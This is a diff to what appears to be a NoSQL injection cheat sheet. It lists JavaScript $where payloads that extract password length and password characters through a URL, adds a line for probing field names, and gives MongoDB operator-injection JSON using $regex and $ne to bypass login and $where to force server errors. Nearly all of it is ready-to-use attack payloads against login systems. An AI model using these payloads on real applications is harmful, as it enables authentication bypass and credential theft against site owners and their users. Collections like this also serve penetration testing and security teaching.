@@ -53,8 +53,11 @@ If this doesn't work, you can try the following:
 ```
 ' && this.password.length < 50%00 >> For extracting password length in URL
 ' && this.password[0] == 'a'%00 >> For extracting password in URL
+' && this.username!=' >> Identifying field names
 ```
-#Operator Injection To Retrieving Unknown Data
+### Identifying field names
+
+# Operator Injection To Retrieving Unknown Data
 
 {"username":{"$regex":"admin"},"password":{"$ne":"Invalid"}}
 {"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"e"} >> To generate an server error.
